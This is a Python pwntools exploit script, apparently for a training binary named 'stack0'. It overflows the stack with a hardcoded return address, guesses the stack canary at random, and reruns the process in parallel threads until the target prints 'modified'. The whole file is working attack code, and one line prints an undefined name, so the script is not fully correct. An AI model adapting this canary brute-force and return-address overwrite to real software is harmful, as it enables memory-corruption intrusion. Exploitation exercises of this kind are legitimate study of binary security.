
# using multithreading (threading module)

import sys
from pwn import *
from random import randint
from time import time
from datetime import timedelta
from threading import Lock, Event
from concurrent.futures import ThreadPoolExecutor

context(aslr=True)

class Tracker():

    def __init__(self):
        self.counter = 0
        self.period_counter = 0

        self.start_timestamp = time()
        self.latest_timestamp = self.start_timestamp

        self.counters_lock = Lock()
        self.calc_lock = Lock()

    def inc_counters(self):
        self.counters_lock.acquire()
        self.counter += 1
        self.period_counter += 1
        self.counters_lock.release()

    def get_metrics(self):
        self.calc_lock.acquire()

        now = time()
        speed = self.period_counter / (now - self.latest_timestamp)
        elapsed = timedelta(seconds=now-self.start_timestamp)

        self.latest_timestamp = now

        self.calc_lock.release()
        return {"speed": speed, "elapsed": elapsed}

    def reset_period_counter(self):
        self.counters_lock.acquire()
        self.period_counter = 0
        self.counters_lock.release()


def bruteforcer(tracker, event):
    winner = pack(0x080484cc)
    #canary = pack(randint(0, 16777216) << 8)

    while not event.is_set():
        canary = pack(randint(0, 16777216) << 8)
        payload = winner*16 + canary + b"LLLL"
    
        p = process("stack0")
        p.sendline(payload)
    
        out = p.recvuntil([b"modified", b"smash"])
        p.kill()
    
        if b"modified" in out:
            print(stdout)
            print("we did it boiz (attempt #%d).." % tracker.counter)
            event.set()

        tracker.inc_counters()
    
        if tracker.counter%100 == 0:
            metrics = tracker.get_metrics()
            sys.stderr.write("attempts: %d | speed: %dp/s | elapsed: %s\n" % (tracker.counter, metrics["speed"], metrics["elapsed"]))
            tracker.reset_period_counter()


if __name__ == "__main__":

    try:
        tracker = Tracker()
        event = Event()
        workers = 2

        with ThreadPoolExecutor(max_workers=workers) as executor:
            for i in range(workers):
                executor.submit(bruteforcer, tracker, event)
    except KeyboardInterrupt:
        event.set()


